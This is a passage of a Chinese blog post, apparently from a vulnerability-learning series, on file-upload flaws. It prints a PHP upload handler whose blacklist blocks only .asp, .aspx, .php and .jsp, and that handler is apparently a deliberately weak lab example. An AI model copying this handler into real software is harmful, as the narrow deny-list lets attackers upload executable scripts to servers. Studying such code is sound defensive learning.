+<h2 id="检查扩展名"><a href="#检查扩展名" class="headerlink" title="检查扩展名"></a>检查扩展名</h2><h3 id="黑名单策略"><a href="#黑名单策略" class="headerlink" title="黑名单策略"></a>黑名单策略</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//黑名单策略</span><br>&lt;li id=<span class="hljs-string">&quot;show_code&quot;</span>&gt;<br>    &lt;h3&gt;代码&lt;/h3&gt;<br>&lt;pre&gt;<br>&lt;code <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">line</span>-<span class="hljs-title">numbers</span> <span class="hljs-title">language</span>-<span class="hljs-title">php</span>&quot;&gt;$<span class="hljs-title">is_upload</span> = <span class="hljs-title">false</span>;</span><br><span class="hljs-class">$<span class="hljs-title">msg</span> = <span class="hljs-title">null</span>;</span><br><span class="hljs-class"><span class="hljs-title">if</span> (<span class="hljs-title">isset</span>($<span class="hljs-title">_POST</span>[&#x27;<span class="hljs-title">submit</span>&#x27;])) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                 <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br>&lt;/code&gt;<br>&lt;/pre&gt;<br>&lt;/li&gt;<br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<p>[^asp]:ASP 文件可包含文本、HTML 标签和脚本。ASP 文件中的脚本可在服务器上执行。总结来说就是一个动态页面</p>
+<section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>就是符号<code>#!</code>这个一般存在于shell脚本的第一行
+<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">#基础漏洞学习</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>文件上传</div>
+      <div>https://tsy244.github.io/2023/11/19/基础漏洞学习/文件上传/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 19, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%BF%90%E8%BE%93%E5%B1%82/" title="运输层">
+                        <span class="hidden-mobile">运输层</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
